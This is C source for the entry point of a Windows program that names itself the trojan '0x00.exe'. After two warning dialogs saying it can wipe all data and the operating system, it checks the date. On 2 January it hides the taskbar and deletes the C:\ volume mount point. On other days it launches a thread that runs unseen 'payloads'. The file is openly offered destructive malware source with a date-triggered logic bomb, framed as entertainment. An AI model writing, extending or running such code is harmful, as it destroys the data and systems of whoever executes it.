#include "0x00.h"

#pragma region Public Variables
#pragma endregion Public Variables 

int WINAPI wWinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR lpCmdLine,
    _In_ int nShowCmd)
{
	  if (GetFileAttributesW(L"C:\\WINDOWS\\645.dat") == INVALID_FILE_ATTRIBUTES) {
		if (MessageBoxW(NULL,
		L"!!!WARNING!!!\n\nYou have ran a Trojan known as 0x00.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?",
		L"0x00.exe - !!!WARNING!!!",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES || MessageBoxW(NULL,
		L"!!!FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue?\nThis is your final chance to stop this program from execution.\n\nGDI only runs on XP.",
		L"0x00.exe - !!!FINAL WARNING!!!",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
    }
    if (DateCheck(DATE_MONTH) == 1 && DateCheck(DATE_DAY) == 2) {
		ShowWindow( FindWindowW(L"Shell_TrayWnd", NULL ), SW_HIDE );
		DeleteVolumeMountPointW(L"C:\\");
	}
	if (DateCheck(DATE_MONTH) == 1 && DateCheck(DATE_DAY) == 31) {
		// SPECIAL MESSAGE //
		MessageBoxW( NULL, L"spare day", L"h", MB_ICONASTERISK );
		exit(0);
	}
	if (!ifWindowsXP()) {
		// If it doesnt run on XP. It shows the error.
		NotXP();
		Sleep(5000);
	}
	
    CreateThread(NULL, NULL, &InitializeAllPayloads, NULL, NULL, NULL);
    
    return 0;
}
